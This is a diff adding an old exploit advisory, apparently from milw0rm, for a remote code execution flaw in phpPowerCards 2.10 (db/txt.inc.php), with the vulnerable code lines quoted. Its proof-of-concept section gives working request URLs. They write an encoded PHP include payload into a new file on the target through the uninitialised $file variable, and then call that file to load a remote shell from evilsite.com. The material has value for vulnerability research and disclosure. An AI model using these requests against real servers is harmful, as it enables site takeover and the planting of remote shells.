@@ -1,0 +1,32 @@
++-------------------------------------------------------------------------------------------
++ phpPowerCards 2.10 (txt.inc.php) Remote Code Execution Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: phpPowerCards 2.10
++ Vendor ............: http://www.giombetti.com/
++ Download ..........: http://lu.download.giombetti.com/phpPowerCards/phppowercards2.10.zip
++ Description .......: "phpPowerCards is a powerfull PHP based postcard script."
++ Class .............: Remote Code Execution
++ Risk ..............: High (Remote Code Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ phpPowerCards db/txt.inc.php does not initialize the $file variable before using it in the
++ fopen() function on line 10, after $file is opened it then writes several variables which
++ are also uninitialized to $file using the fputs() function. Assuming register_globals = on,
++ we can initialize these variables in a query string and then write anything to a file we
++ desire on the target box that's running phpPowerCards.
++ 
++ Vulnerable Code:
++ db/txt.inc.php, line(s) 10: $fp = fopen("$file","a");
++ db/txt.inc.php, line(s) 23: fputs($fp, $email[to]. "¦¦" .$email[from]. "¦¦" .$name[to]. "¦¦" .$name[from]. "¦¦" .$picture. "¦¦" .$comment. "¦¦" .$sessionID. "\n");
++ 
++ Proof of Concept:
++ http://[target]/[path]/db/txt.inc.php?file=[file]&check=0&email[to]=[evil code]
++ http://[target]/[path]/db/txt.inc.php?file=[file]&check=0&comment=[evil code]
++ ... same thing repeated for each variable in the second argument of fputs() on line 23
++ 
++ -> http://[target]/[path]/db/txt.inc.php?file=../evilfile.php&check=0&email[to]=+%3C%3Fphp+include%28%24evil_include%29%3B+%3F%3E+
++ -> http://[target]/[path]/evilfile.php?evil_include=http://evilsite.com/shell.php
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-10-18]
